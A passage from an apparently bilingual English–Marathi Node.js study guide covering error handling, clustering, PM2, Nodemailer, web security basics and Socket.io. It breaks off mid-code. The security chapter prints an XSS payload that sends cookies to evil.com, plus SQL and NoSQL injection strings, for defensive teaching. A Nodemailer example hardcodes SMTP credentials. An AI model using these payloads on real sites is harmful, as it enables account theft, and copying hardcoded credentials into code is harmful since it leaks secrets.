मराठी सारांश (Global Error Handling):
  • Route मध्ये error आला तर app crash होऊ शकतो किंवा user ला रिकामी screen दिसते.
  • Express चा error-handling middleware: नेमके 4 arguments (err, req, res, next). 4 नसतील तर Express त्याला error handler मानत नाही.
  • Route मध्ये next(error) केले की Express बाकी routes सोडून थेट या handler कडे जातो.
  • हा middleware app.js मध्ये सगळ्यात शेवटी ठेवा.
  • फायदा: सगळे errors एकाच ठिकाणी, एकसारख्या format मध्ये (status + message).
  • उदाहरण: हॉस्पिटलचा emergency ward. कोणत्याही विभागात अडचण आली तरी रुग्ण थेट तिथे पाठवला जातो.

Q. Error Handling in Node.js (Complete Guide)

Concept:
  • Error handling means catching problems (invalid input, DB down, missing file, bugs) and responding in a controlled way, instead of crashing or leaving requests hanging.
  • In Node.js, the right technique depends on how the code runs: synchronous code, callbacks, Promises, async/await, events and streams each report errors differently.
  • An unhandled error in Node.js can crash the whole process, taking every user offline, not just the one request.
  • Simple example: a car's safety system. Small issues show a warning light (handled error); serious ones stop the car safely (graceful shutdown); none should make the car explode (crash).
1. Operational Errors vs Programmer Errors
  • Operational errors = expected runtime problems in correct code: invalid user input, file not found, DB connection lost, network timeout, duplicate email.
    • ✅ Handle them: return 400/404/409/503, retry, log, show a friendly message.
  • Programmer errors = bugs in the code: undefined is not a function, reading a property of null, wrong arguments.
    • ✅ Fix the code. At runtime, log them, return 500, and (for unexpected crashes) restart the process with PM2, because the app's state may be corrupted.
PointOperational ErrorProgrammer Error
CauseOutside conditionsBug in the code
ExamplesBad input, file missing, DB down, timeoutTypeError, ReferenceError, typo
Expected?Yes, it will happen sometimesNo
ResponseHandle gracefully (4xx / 503, retry)Log, 500, fix the code, restart if needed
2. Error Handling by Code Style
  • Synchronous code → try / catch.
  • Callbacks → check the first argument: if (err) return .... (A try/catch around an async call does not catch errors thrown later inside its callback.)
  • Promises → .catch() at the end of the chain.
  • async/await → try / catch around the awaits.
  • EventEmitters / Streams → .on('error', ...). An 'error' event with no listener crashes the process. Use pipeline() for streams.
  • Last safety net (process level) → process.on('uncaughtException') and process.on('unhandledRejection'): log, then shut down gracefully. Don't use them to keep running normally.
Code Example: Each Style
const fs = require('fs');

// 1) Sync → try/catch
try {
    const config = JSON.parse('{bad json}');
} catch (err) {
    console.error('Invalid JSON:', err.message);
}

// 2) Callback → error-first check
fs.readFile('missing.txt', 'utf8', (err, data) => {
    if (err) return console.error('Read failed:', err.code);   // ENOENT
    console.log(data);
});

// 3) Promise → .catch()
fs.promises.readFile('missing.txt', 'utf8')
    .then(data => console.log(data))
    .catch(err => console.error('Read failed:', err.code));

// 4) async/await → try/catch
async function load() {
    try {
        return await fs.promises.readFile('missing.txt', 'utf8');
    } catch (err) {
        if (err.code === 'ENOENT') return '';                    // operational: handle it
        throw err;                                               // unknown: pass it up
    }
}

// 5) Events / streams → 'error' listener
const stream = fs.createReadStream('missing.txt');
stream.on('error', err => console.error('Stream error:', err.message));

// 6) Process-level safety net (log + exit; PM2 restarts the app)
process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Promise rejection:', reason);
    process.exit(1);
});
process.on('uncaughtException', (err) => {
    console.error('Uncaught exception:', err);
    process.exit(1);
});
3. Custom Error Classes
  • Extend the built-in Error class to add useful fields like statusCode and isOperational.
  • Then you can throw new NotFoundError('User not found') anywhere, and one global handler turns it into the right HTTP response.
  • Always throw Error objects (or subclasses), never plain strings, so you keep the stack trace.
Code Example: Custom Errors + asyncHandler + Global Handler (Express)
// errors.js
class AppError extends Error {
    constructor(message, statusCode = 500) {
        super(message);                 // sets this.message
        this.name = this.constructor.name;
        this.statusCode = statusCode;
        this.isOperational = true;      // expected error, safe to show the message
        Error.captureStackTrace(this, this.constructor);
    }
}
class NotFoundError extends AppError {
    constructor(msg = 'Resource not found') { super(msg, 404); }
}
class ValidationError extends AppError {
    constructor(msg = 'Invalid input') { super(msg, 400); }
}

// asyncHandler: forwards rejected Promises to next(err)
// (Express 5 does this automatically; Express 4 needs this wrapper)
const asyncHandler = (fn) => (req, res, next) =>
    Promise.resolve(fn(req, res, next)).catch(next);

// routes
app.get('/users/:id', asyncHandler(async (req, res) => {
    if (isNaN(req.params.id)) throw new ValidationError('id must be a number');
    const user = await User.findById(req.params.id);
    if (!user) throw new NotFoundError('User not found');
    res.json(user);
}));

// global error handler (LAST)
app.use((err, req, res, next) => {
    const status = err.statusCode || 500;
    if (!err.isOperational) console.error('BUG:', err);           // log full details for bugs
    res.status(status).json({
        error: err.isOperational ? err.message : 'Something went wrong'  // hide bug details
    });
});
Best Practices:
  • Always handle errors at every async boundary (callback err, .catch, try/catch, 'error' events).
  • Use custom error classes plus one global Express error handler.
  • Never send stack traces or internal details to clients in production.
  • Log errors with context (route, user, time) using a logger like winston/pino.
  • Validate input early, so bad data fails with 400 instead of a confusing 500 later.
  • For unknown bugs: log, exit, and let PM2 / Docker restart a clean process.
मराठी सारांश (Node.js Error Handling):
  • Error handling म्हणजे अडचण आली तरी app crash न होता नियंत्रित पद्धतीने उत्तर देणे. Node.js मध्ये एक unhandled error संपूर्ण server बंद करू शकतो (सगळ्या users साठी).
  • Operational errors: अपेक्षित अडचणी. चुकीचा input, file नाही, DB बंद, timeout. यांना handle करा (400 / 404 / 409 / 503, retry).
  • Programmer errors: code मधील bugs (TypeError, undefined). Code fix करा. Runtime ला log करा, 500 द्या, गरज असल्यास process restart (PM2).
  • पद्धत code प्रमाणे: Sync → try/catch. Callback → if (err). Promise → .catch(). async/await → try/catch. Events / streams → .on('error').
  • लक्षात ठेवा: async callback च्या आत नंतर झालेला error बाहेरच्या try/catch ने पकडला जात नाही.
  • Safety net: uncaughtException / unhandledRejection वर log करून बंद करा. App तसाच चालू ठेवू नका.
  • Custom Error classes: class NotFoundError extends AppError मध्ये statusCode + isOperational. कुठेही throw करा, एक global handler योग्य response देतो.
  • asyncHandler: Express 4 मध्ये async route चे errors next(err) ला पाठवण्यासाठी wrapper. Express 5 हे आपोआप करतो.
  • Best practices: production मध्ये stack trace client ला दाखवू नका, errors log करा, input आधी validate करा, नेहमी Error object throw करा (string नाही).
  • उदाहरण: गाडीची safety system. छोटी अडचण = warning light (handled). मोठी = गाडी सुरक्षित थांबवणे (graceful shutdown). स्फोट (crash) कधीच नाही.

Chapter 28: Child Processes & Worker Threads

Q. How does Node.js handle CPU-heavy tasks if it is single-threaded?

Concept:
  • Node.js is great for I/O tasks (database, network).
  • It is bad at heavy CPU tasks (video processing, image resizing, complex math) on the main thread, because they block the single JS thread and every other request waits.
  • To solve this, Node.js provides Worker Threads and Child Processes.
  • Child Process: Spawns a completely new process (heavy). Use it to run another program or script (exec, spawn, fork).
  • Worker Threads: Spawns a background thread within the same process that can share memory (lighter and better for CPU tasks in JS).
  • See Chapter 18 for a full Worker Threads and Cluster code example.
PointChild ProcessWorker Thread
What it createsA new OS processA new thread in the same process
MemorySeparateCan share (SharedArrayBuffer)
CostHeavyLight
CommunicationIPC (process.send)postMessage
Best forRunning other programs or scriptsCPU-heavy JavaScript
मराठी सारांश (CPU-heavy कामे):
  • Node.js I/O (DB, network) साठी उत्तम, पण heavy calculation (video, image processing) main thread वर केल्यास सगळे अडकते.
  • Child Process: पूर्ण नवीन process (जड). दुसरा program / script चालवायला. exec, spawn, fork.
  • Worker Threads: त्याच process मध्ये नवीन thread (हलका). CPU-heavy JS code साठी सर्वोत्तम.
  • उदाहरण: Child process = नवीन कर्मचारी वेगळ्या office मध्ये. Worker thread = त्याच office मध्ये मदतनीस.

Q. What is the Cluster Module? (Using All CPU Cores)

Concept:
  • A single Node.js process runs JavaScript on one CPU core. On an 8-core server, 7 cores sit idle.
  • The built-in cluster module lets one primary process fork several worker processes (usually one per core), all running the same app and sharing the same port.
  • Incoming connections are load-balanced across the workers (round-robin by default, except on Windows).
  • Each worker is a separate process with its own memory, event loop and V8 instance, so they don't share variables.
  • If a worker crashes, the primary can start a replacement, which improves availability.
  • Simple example: a bank with one queue but 8 counters. A manager (primary) sends each customer to a free counter (worker). If one clerk leaves, the manager seats a new one.
Diagram: Cluster — Primary + Workers Sharing Port 3000
Code Example: Cluster with Auto-Restart
const cluster = require('cluster');
const http = require('http');
const os = require('os');

const numCPUs = os.availableParallelism ? os.availableParallelism() : os.cpus().length;

if (cluster.isPrimary) {
    console.log(`Primary ${process.pid} starting ${numCPUs} workers`);

    for (let i = 0; i < numCPUs; i++) cluster.fork();      // one worker per core

    cluster.on('exit', (worker, code, signal) => {          // a worker died
        console.log(`Worker ${worker.process.pid} died (${signal || code}). Restarting...`);
        cluster.fork();                                     // replace it
    });
} else {
    // Worker: runs the real app; all workers share port 3000
    http.createServer((req, res) => {
        res.end(`Handled by worker ${process.pid}`);
    }).listen(3000);
    console.log(`Worker ${process.pid} started`);
}
  • cluster.isPrimary: true in the parent process (older name: isMaster).
  • cluster.fork([env]): Starts a new worker process running this same file; optional extra env variables.
  • cluster.on('exit', (worker, code, signal) => {}): Fires when a worker dies; use it to re-fork.
  • cluster.workers: Object of all live workers. worker.send(msg) / process.on('message'): messages between primary and workers (IPC).
  • os.availableParallelism(): Recommended way to get the number of usable cores (Node 18.14+).
Important Points:
  • No shared memory: in-memory sessions, caches, rate-limit counters and Socket.io rooms are per worker. Use Redis (or a DB) for shared state.
  • In practice, most teams use PM2 cluster mode (pm2 start app.js -i max), which does the same with no code changes (Chapter 29). Docker/Kubernetes setups often run one process per container and scale containers instead.
  • Cluster vs Worker Threads: Cluster = more processes to handle more requests (scale the server). Worker threads = extra threads to run CPU-heavy work without blocking one process.
PointClusterWorker ThreadsChild Process
CreatesCopies of the same app (processes)Threads in one processAny new process/program
GoalHandle more requests (use all cores)Offload CPU-heavy JSRun other scripts/commands
MemorySeparateCan share (SharedArrayBuffer)Separate
Share a port✅ Yes❌ No❌ No
मराठी सारांश (Cluster Module):
  • एक Node process JS फक्त एका CPU core वर चालवतो. 8 cores असले तर 7 रिकामे राहतात.
  • Cluster: एक primary process प्रत्येक core साठी एक worker process (cluster.fork()) बनवतो. सगळे workers same app चालवतात आणि same port share करतात.
  • Requests workers मध्ये वाटल्या जातात (load balancing). Worker crash झाला तर 'exit' event मध्ये नवीन fork करतो.
  • महत्वाचे: प्रत्येक worker ची memory वेगळी. Sessions, cache, rate limit, Socket.io rooms share होत नाहीत. यासाठी Redis वापरा.
  • व्यवहारात: PM2 cluster mode (pm2 start app.js -i max) हेच काम code न बदलता करतो.
  • Cluster vs Worker threads: Cluster = जास्त requests handle करायला जास्त processes. Worker threads = heavy CPU काम वेगळ्या thread मध्ये.
  • उदाहरण: बँकेत एक रांग पण 8 counters. Manager (primary) प्रत्येक ग्राहकाला मोकळ्या counter (worker) वर पाठवतो. एक clerk गेला तर नवीन बसवतो.

Chapter 29: Production Process Management (PM2)

Q. What happens if our Node.js app crashes in production?

  • If you start an app with node app.js and an error occurs, the server stops. Your website goes down until you manually restart it.
  • In production, we use a Process Manager like PM2 (npm install -g pm2).
  • Benefits of PM2:
  • Automatically restarts the app if it crashes.
  • Keeps the app running in the background even if you close the terminal.
  • Can run multiple instances of the app to balance the load (Cluster mode).
मराठी सारांश:
  • आपण कधीही लाईव्ह सर्व्हरवर node app.js वापरत नाही.
  • आपण PM2 वापरतो.
  • कारण जर कधी एरर आला आणि सर्व्हर बंद पडला, तर PM2 त्याला सेकंदात आपोआप परत चालू (restart) करतो!
  • इतर फायदे: terminal बंद केले तरी app background मध्ये चालू, cluster mode ने सर्व CPU cores वापरणे, logs आणि monitoring.
  • Commands: pm2 start app.js, pm2 start app.js -i max (cluster), pm2 list, pm2 logs, pm2 restart app, pm2 stop app.

Q. What is ecosystem.config.js in PM2?

Concept:
  • ecosystem.config.js is PM2's configuration file.
  • Instead of typing long commands with many flags, you write all settings (app name, script, instances, environment variables, logs, restart rules) in one file, and start everything with one command.
  • It can describe several apps at once (e.g. an API server and a background worker).
  • It can be committed to Git, so every server runs the app the same way.
  • Simple example: a recipe card. Instead of telling the cook every step each time, you hand over the card and say "make this".
Code Example: ecosystem.config.js
// ecosystem.config.js  (create a starter with: pm2 init simple)
module.exports = {
  apps: [
    {
      name: 'my-api',                 // name shown in "pm2 list"
      script: './server.js',          // entry file
      instances: 'max',               // one process per CPU core (or a number, e.g. 2)
      exec_mode: 'cluster',           // load-balance between instances
      watch: false,                   // true = restart on file change (dev only)
      max_memory_restart: '500M',     // auto-restart if memory goes above 500 MB
      autorestart: true,              // restart after a crash (default)
      env: {                          // default environment
        NODE_ENV: 'development',
        PORT: 3000
      },
      env_production: {               // used with --env production
        NODE_ENV: 'production',
        PORT: 8080
      },
      error_file: './logs/error.log',
      out_file: './logs/out.log',
      time: true                      // add timestamps to logs
    },
    {
      name: 'email-worker',           // a second app (background job)
      script: './worker.js',
      instances: 1
    }
  ]
};
Commands Using the Config File
pm2 start ecosystem.config.js                    # start all apps (env)
pm2 start ecosystem.config.js --env production   # use env_production values
pm2 reload ecosystem.config.js                   # zero-downtime reload (cluster mode)
pm2 stop ecosystem.config.js                     # stop all apps
pm2 logs my-api                                  # view logs of one app
pm2 monit                                        # live CPU / memory dashboard
pm2 save && pm2 startup                          # auto-start apps after server reboot
Important Options Explained:
  • name: App name used in PM2 commands.
  • script: Path of the file to run.
  • instances: How many processes; 'max' = number of CPU cores.
  • exec_mode: 'fork' (default, single process) or 'cluster' (multiple processes sharing one port).
  • watch: Restart when files change (useful in development only).
  • max_memory_restart: Restart the app if it uses more memory than this (protects against memory leaks).
  • env / env_production: Environment variables; pick a set with --env production.
  • error_file / out_file / time: Where logs are written, with timestamps.
  • reload vs restart: restart stops then starts (brief downtime). reload restarts cluster instances one by one, so there's zero downtime.
मराठी सारांश (ecosystem.config.js):
  • ecosystem.config.js ही PM2 ची configuration file आहे. सगळ्या settings एकाच file मध्ये.
  • लांब commands आणि flags पुन्हा पुन्हा लिहायची गरज नाही. फक्त pm2 start ecosystem.config.js.
  • name (app चे नाव), script (कोणती file), instances: 'max' (प्रत्येक CPU core साठी एक process), exec_mode: 'cluster' (load balancing).
  • max_memory_restart: memory मर्यादेपेक्षा जास्त झाली की app आपोआप restart (memory leak पासून संरक्षण).
  • env / env_production: वेगळ्या environments साठी वेगळे variables. --env production ने निवडा.
  • reload vs restart: restart = थोडा वेळ app बंद. reload = cluster मध्ये एक-एक process बदलतो, downtime शून्य.
  • pm2 save + pm2 startup: server reboot झाला तरी apps आपोआप सुरू.
  • एका file मध्ये अनेक apps (API + background worker) लिहिता येतात, आणि file Git मध्ये ठेवता येते.
  • उदाहरण: recipe card. आचाऱ्याला प्रत्येक वेळी सगळ्या सूचना न देता card दिले की काम.
SECTION 10: EXTERNAL MODULES & UTILITIES

Chapter 30: Sending Emails (Nodemailer)

Q. What is Nodemailer?

Definition:
  • Nodemailer is a popular third-party npm package used in Node.js applications to send emails easily.
  • To send an email, you need an SMTP (Simple Mail Transfer Protocol) server.
  • For testing purposes during development, we often use fake SMTP services like Ethereal Email so we don't spam real email accounts.
  • In production, you would configure it with real services like Gmail, SendGrid, or Amazon SES.
  • Installation: npm install nodemailer

Q. Steps to Send an Email

  • 1. Create a Transporter: This defines the connection to the SMTP server (Host, Port, and Authentication credentials like username/password).
  • 2. Define Mail Options: Create an object specifying the from, to, subject, text, and html body of the email.
  • 3. Send Mail: Call transporter.sendMail(options) to dispatch the email.
Code Example: Sending an Email (Using Ethereal SMTP)
const nodemailer = require("nodemailer");

const sendMail = async () => {
    try {
        // 1. Create the Transporter
        const transporter = nodemailer.createTransport({
            host: 'smtp.ethereal.email',
            port: 587,
            auth: {
                user: 'mekhi.simonis42@ethereal.email',
                pass: 'XncVpdmhXVwRDP42y4'
            }
        });

        // 2. Send the Email
        const info = await transporter.sendMail({
            from: '"Vishal Shinde" <shindev05@gmail.com>', // Sender
            to: "vishalshinde00126@gmail.com",          // Receiver
            subject: "Hello from Node.js! ✔",           // Subject line
            text: "Hello world? This is plain text",    // Plain text body
            html: "<b>Hello world?</b> This is HTML"  // HTML body
        });

        console.log("Message sent: %s", info.messageId);
        
    } catch (error) {
        console.error("Error sending email:", error);
    }
};

sendMail();
मराठी सारांश:
  • Node.js मधून Email पाठवण्यासाठी nodemailer package वापरतात.
  • यासाठी पहिल्यांदा SMTP सर्वर ची माहिती देऊन createTransport बनवावा लागतो, आणि मग sendMail function वापरून आपण मेसेज पाठवू शकतो.
  • प्रॅक्टिससाठी आपण Ethereal Email सारखा फेक SMTP वापरतो. Production मध्ये Gmail, SendGrid, Amazon SES.
  • Step 1 (Transporter): SMTP connection: host, port (587 / 465), auth (user, pass).
  • Step 2 (Mail options): from, to, subject, text (साधा), html (design केलेला).
  • Step 3: await transporter.sendMail(options). Result मध्ये messageId मिळतो.
  • Security: SMTP user / password नेहमी .env मध्ये ठेवा, code मध्ये नाही.
  • उपयोग: welcome email, OTP, password reset link, order confirmation.

Interview Questions (Detailed)

Q1. What protocol is used to send emails in Node.js?
  • SMTP (Simple Mail Transfer Protocol) is used. Nodemailer acts as a client that connects to an SMTP server to deliver the mail.
Q2. Can I use my personal Gmail account to send emails via Nodemailer?
  • Yes, you can configure the Gmail SMTP host (smtp.gmail.com).
  • However, you cannot use your normal password. You must enable 2-Factor Authentication on your Google Account and generate an "App Password" to use in the auth.pass field.
मराठी सारांश (Interview):
  • Interview मध्ये विचारतात: "Gmail वापरून ईमेल कसा पाठवायचा?".
  • उत्तर: Gmail चे SMTP वापरता येते, पण सुरक्षेसाठी आपला नेहमीचा पासवर्ड न वापरता, गुगल सेटिंग्ज मधून "App Password" तयार करून तो Nodemailer मध्ये वापरावा लागतो.

Quick Revision Summary

Concept / Method Description
nodemailer The npm package used for sending emails.
SMTP The underlying protocol (Simple Mail Transfer Protocol) used to send emails.
createTransport() Configures the server host, port, and authentication credentials.
sendMail() Executes the sending of the email with defined sender, receiver, and content.
SECTION 11: SECURITY, REAL-TIME & PRODUCTION HEALTH

Chapter 31: Security Basics (Helmet, Rate Limiting, Validation, XSS, Injection)

Q. Why is Security Important in a Node.js Backend?

Concept:
  • A backend is open to the whole internet. Attackers send fake, malformed or malicious requests to steal data, take over accounts or bring the server down.
  • Security is about layers (defence in depth): secure headers, request limits, input validation, safe database queries, safe output, secure cookies/tokens, HTTPS, and up-to-date packages.
  • Golden rule: never trust client input: req.body, req.query, req.params, headers, cookies and uploaded files can all be faked.
  • Simple example: a bank branch has a guard at the door (rate limit), checks ID (validation), uses locked counters (headers) and CCTV (logging). One lock alone isn't enough.
Common Attacks (Quick Map):
  • Injection (SQL / NoSQL): attacker puts query code inside input to read or change your database.
  • XSS (Cross-Site Scripting): attacker stores a <script> in your data; it runs in other users' browsers and steals cookies/tokens.
  • CSRF (Cross-Site Request Forgery): a malicious site makes the user's browser send a request to your site using their cookies.
  • Brute force / DoS: thousands of login attempts or requests to guess passwords or overload the server.
  • Sensitive data exposure: leaking stack traces, secrets in code, plain-text passwords.
  • Vulnerable dependencies: old npm packages with known security holes.

Q. What is Helmet? (Secure HTTP Headers)

Concept:
  • helmet is an Express middleware that sets security-related HTTP response headers with one line.
  • These headers tell the browser to block common attacks (clickjacking, MIME sniffing, some XSS) and force HTTPS.
  • It also removes the X-Powered-By: Express header, so attackers don't learn what you're running.
  • Simple example: safety stickers on a building's doors: "No entry without ID", "Fire exit only". The browser reads and obeys them.
Code Example: Using Helmet
// npm install helmet
const express = require('express');
const helmet = require('helmet');
const app = express();

app.use(helmet());   // ✅ adds ~15 security headers, removes X-Powered-By

// Optional: customise one header (Content-Security-Policy)
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],                       // load content only from our site
        scriptSrc: ["'self'", 'https://cdn.jsdelivr.net'],
        imgSrc: ["'self'", 'data:']
    }
}));
Important Headers Helmet Sets:
  • Content-Security-Policy: which sources scripts/styles/images may load from (strong XSS defence).
  • Strict-Transport-Security: force HTTPS for future visits.
  • X-Frame-Options / frame-ancestors: stop your site being embedded in an iframe (clickjacking).
  • X-Content-Type-Options: nosniff: stop the browser guessing file types.
  • Referrer-Policy: limit what URL info is sent to other sites.

Q. What is Rate Limiting?

Concept:
  • Rate limiting caps how many requests one client (usually one IP) can make in a time window, e.g. 100 requests per 15 minutes.
  • Extra requests get 429 Too Many Requests.
  • It protects against brute-force login attempts, spam, scraping and simple DoS attacks.
  • Use a stricter limit on sensitive routes like /login, /register, /forgot-password, /otp.
  • Simple example: an ATM that blocks the card after 3 wrong PIN attempts.
Code Example: express-rate-limit
// npm install express-rate-limit
const rateLimit = require('express-rate-limit');

// General limit for all /api routes
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,      // 15 minutes
    limit: 100,                    // max 100 requests per IP per window
    standardHeaders: 'draft-7',    // send RateLimit-* headers
    legacyHeaders: false,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api', apiLimiter);

// Strict limit for login (brute-force protection)
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, limit: 5 });
app.post('/api/login', loginLimiter, loginHandler);

// Behind Nginx / a load balancer, so req.ip is the real client IP:
app.set('trust proxy', 1);
  • windowMs: Length of the time window in milliseconds.
  • limit (older versions: max): Allowed requests per client per window.
  • message: Body sent with the 429 response.
  • store: Default is in memory (per process). With several servers or PM2 cluster, use a shared store like Redis (rate-limit-redis) so the limit is global.

Q. What is Input Validation? (Joi / Zod / express-validator)

Concept:
  • Validation checks that incoming data has the right shape, types and values before you use it: required fields, string vs number, email format, min/max length, allowed values.
  • Sanitization cleans data: trims spaces, lower-cases emails, strips HTML.
  • Validate at the edge (in a middleware, before the controller), and return 400 with clear messages.
  • Only pick the fields you expect. Never pass req.body straight into the database (an attacker could add "role": "admin" — this is called mass assignment).
  • Popular libraries: zod (TypeScript-friendly), joi, express-validator.
  • Simple example: a form clerk who rejects an application with a missing photo or an invalid date of birth before it goes into the system.
Code Example: Validation Middleware with Zod
// npm install zod
const { z } = require('zod');

const registerSchema = z.object({
    name:     z.string().trim().min(2).max(50),
    email:    z.string().trim().toLowerCase().email(),
    password: z.string().min(8, 'Password must be at least 8 characters'),
    age:      z.coerce.number().int().min(13).optional()   // "25" → 25
});

// Reusable middleware
const validate = (schema) => (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
        return res.status(400).json({ errors: result.error.flatten().fieldErrors });
    }
    req.body = result.data;     // ✅ only clean, known fields (blocks mass assignment)
    next();
};

app.post('/api/register', validate(registerSchema), registerHandler);
  • z.object({...}): Describes the expected object. Unknown keys are dropped by default.
  • .min() / .max() / .email() / .int(): Rules for each field. .optional(): Field may be missing.
  • z.coerce.number(): Converts strings (from query/forms) into numbers.
  • schema.safeParse(data): Returns { success, data } or { success: false, error } instead of throwing.

Q. SQL / NoSQL Injection and How to Prevent It

Concept:
  • Injection happens when user input is placed directly into a database query, so the input is treated as code instead of data.
  • SQL injection: input like ' OR '1'='1 turns a login query into "match any user".
  • NoSQL injection (MongoDB): input like { "$gt": "" } turns { password: input } into "password greater than empty", which matches every user.
  • Fix: never build queries by string concatenation; use parameterized queries / ORM methods; validate types (a password must be a string, not an object).
  • Simple example: a form that asks "Your name?" and someone writes "Ramesh — and also give me everyone's salary". Injection is the system obeying the second part.
Code Example: ❌ Vulnerable vs ✅ Safe
// ───── SQL (mysql2) ─────
// ❌ String concatenation → SQL injection
const sql = `SELECT * FROM users WHERE email = '${req.body.email}'`;

// ✅ Parameterized query: input is always treated as DATA
const [rows] = await db.execute('SELECT * FROM users WHERE email = ?', [req.body.email]);

// ───── MongoDB (mongoose) ─────
// Attacker sends: { "email": "admin@site.com", "password": { "$gt": "" } }
// ❌ Object goes straight into the query → matches any password
const user = await User.findOne({ email: req.body.email, password: req.body.password });

// ✅ Validate types first (zod: password must be a string), and compare hashes
if (typeof req.body.password !== 'string') return res.status(400).json({ error: 'Invalid input' });
const found = await User.findOne({ email: String(req.body.email) });
const ok = found && await bcrypt.compare(req.body.password, found.passwordHash);

// Mongoose extra safety: reject "$" operators in query filters
mongoose.set('sanitizeFilter', true);

Q. What is XSS (Cross-Site Scripting) and How to Prevent It?

Concept:
  • XSS happens when an attacker manages to put their own JavaScript into a page that other users view.
  • Example: a comment saved as <script>fetch('https://evil.com?c='+document.cookie)</script>. Every visitor's browser runs it and sends their cookies to the attacker.
  • Types: Stored (saved in your DB, e.g. comments), Reflected (in a URL parameter echoed back), DOM-based (frontend JS writes unsafe data into the page).
  • Simple example: someone writes a fake instruction on a public notice board, and everyone who reads it follows it.
How to Prevent XSS:
  • Escape output: template engines escape by default: Handlebars {{name}}, EJS <%= name %>. Avoid raw output ({{{ }}}, <%- %>) for user data.
  • Frontend: use textContent, not innerHTML, for user data. React escapes by default (avoid dangerouslySetInnerHTML).
  • If you must allow some HTML (rich text), sanitize it with a library like sanitize-html or DOMPurify.
  • Content-Security-Policy header (Helmet) blocks inline/unknown scripts.
  • httpOnly cookies so even if XSS happens, the script can't read the session/JWT cookie.
  • Validate input (e.g. a name shouldn't contain < or >).

Q. Other Essential Security Practices (Checklist)

  • CSRF: with cookie-based auth, use sameSite: 'lax'/'strict' cookies and, for forms, a CSRF token. (APIs using Authorization: Bearer headers are not affected by CSRF.)
  • Passwords: hash with bcrypt/argon2; never store or log plain text.
  • Secrets: keep keys and DB passwords in .env; never commit them; rotate them if leaked.
  • HTTPS everywhere in production; secure cookies.
  • Error messages: don't send stack traces or internal details to clients.
  • Request size limits: express.json({ limit: '10kb' }) to stop huge payloads.
  • Dependencies: run npm audit, update regularly, avoid unmaintained packages.
  • CORS: allow only your real frontend origins, not *, for authenticated APIs.
  • Least privilege: the DB user should have only the permissions the app needs; don't run Node as root.
  • Logging & monitoring: log failed logins and unusual activity (Chapter 33).
Code Example: A Secure Express Setup (All Together)
const app = express();
app.set('trust proxy', 1);
app.use(helmet());                                         // secure headers
app.use(cors({ origin: ['https://myapp.com'], credentials: true }));
app.use(express.json({ limit: '10kb' }));                  // body size limit
app.use('/api', rateLimit({ windowMs: 15 * 60 * 1000, limit: 100 }));

app.post('/api/register', validate(registerSchema), registerHandler); // validation
app.use(errorHandler);                                     // no stack traces to clients
मराठी सारांश (Security Basics):
  • Golden rule: client कडून आलेल्या कोणत्याही गोष्टीवर (body, query, params, headers, cookies, files) विश्वास ठेवू नका.
  • Helmet: एका line मध्ये security headers (CSP, HTTPS सक्ती, clickjacking संरक्षण, nosniff) लावतो आणि X-Powered-By लपवतो.
  • Rate limiting: एका IP ला ठराविक वेळेत मर्यादित requests (उदा. 15 मिनिटांत 100). जास्त झाल्यास 429. Login साठी कडक मर्यादा (उदा. 5). Brute force आणि DoS पासून संरक्षण.
  • Validation (Zod / Joi): data चा प्रकार, format, मर्यादा तपासा. चुकीचे असल्यास 400. फक्त अपेक्षित fields घ्या, req.body थेट DB मध्ये टाकू नका (mass assignment, उदा. role: admin).
  • Injection: user input थेट query मध्ये जोडल्यास ते code म्हणून चालते. SQL मध्ये ' OR '1'='1, MongoDB मध्ये { "$gt": "" }. उपाय: parameterized queries (?), types validate करा, sanitizeFilter.
  • XSS: attacker चा <script> दुसऱ्या users च्या browser मध्ये चालतो आणि cookies चोरतो. उपाय: output escape करा ({{name}}), innerHTML टाळा, CSP header, httpOnly cookies, HTML sanitize करा.
  • CSRF: दुसरी site user च्या cookies वापरून request पाठवते. उपाय: sameSite cookies, CSRF token.
  • इतर: bcrypt passwords, secrets .env मध्ये, HTTPS, stack trace लपवा, body size limit, npm audit, CORS मर्यादित origins.
  • उदाहरण: बँक. दारावर guard (rate limit), ओळखपत्र तपासणी (validation), लॉक केलेले counter (headers), CCTV (logging). एकच कुलूप पुरेसे नसते.

Chapter 32: WebSockets & Socket.io (Real-Time Communication)

Q. What are WebSockets? (HTTP vs WebSocket)

Concept:
  • HTTP is request–response: the client asks, the server answers, the exchange ends. The server can't send data on its own.
  • WebSocket is a protocol that keeps one connection open between client and server, so both sides can send messages at any time (full-duplex, real-time).
  • It starts as a normal HTTP request with an Upgrade: websocket header; the server replies 101 Switching Protocols, and the connection stays open.
  • Used for: chat apps, live notifications, multiplayer games, live scores/stock prices, collaborative editors, live delivery tracking.
  • Simple example: HTTP is like sending letters (send, wait for a reply, done). WebSocket is like a phone call: once connected, both people can talk anytime.
PointHTTPWebSocket
ConnectionNew request each time (short-lived)One long-lived connection
DirectionClient → server only (server replies)Both ways, anytime (full-duplex)
Server push❌ Not possible (needs polling)✅ Server can send anytime
OverheadHeaders on every requestSmall frames after the handshake
URLhttp:// / https://ws:// / wss://
Best forREST APIs, pages, filesChat, live updates, games

Q. What is Socket.io?

Concept:
  • Socket.io is a popular library (server + browser client) for real-time, event-based communication, built on top of WebSockets.
  • It adds features that raw WebSockets don't have:
    • Events: send named events with data: socket.emit('chat', msg) / socket.on('chat', ...) (same idea as EventEmitter).
    • Auto-reconnect if the connection drops.
    • Fallback to HTTP long-polling when WebSockets are blocked.
    • Rooms (groups like "chat-room-5") and broadcasting to many clients.
    • Acknowledgements (callbacks to confirm a message was received).
  • ⚠️ A Socket.io client can only talk to a Socket.io server (it is not a plain WebSocket).
Diagram: Socket.io Chat — Emit and Broadcast
Code Example: Real-Time Chat (Server: server.js)
// npm install express socket.io
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);          // Socket.io needs the raw http server
const io = new Server(server, {
    cors: { origin: 'http://localhost:5173' }    // allow your frontend
});

io.on('connection', (socket) => {                 // runs for EACH connected client
    console.log('User connected:', socket.id);

    // receive an event from this client
    socket.on('chat', (msg) => {
        io.emit('chat', { from: socket.id, msg });        // send to EVERYONE
    });

    // rooms: join a group
    socket.on('joinRoom', (room) => {
        socket.join(room);
        socket.to(room).emit('notice', `${socket.id} joined ${room}`); // others in room
    });

    // acknowledgement: confirm delivery
